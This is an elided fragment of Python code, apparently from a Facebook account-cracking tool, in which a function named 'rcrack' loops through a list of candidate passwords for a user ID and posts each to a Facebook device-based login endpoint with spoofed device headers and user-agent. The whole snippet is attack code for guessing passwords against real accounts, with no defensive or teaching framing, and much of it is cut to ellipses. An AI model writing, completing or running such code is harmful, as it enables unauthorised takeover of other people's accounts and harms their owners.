...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_fb = session.get('https://b-graph.facebook.com').text
            log_data = {
          ...
          'dpr': '1.7000000476837158',
           ...
           'user-agent': pro}
            lo = session.post('https://b-graph.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
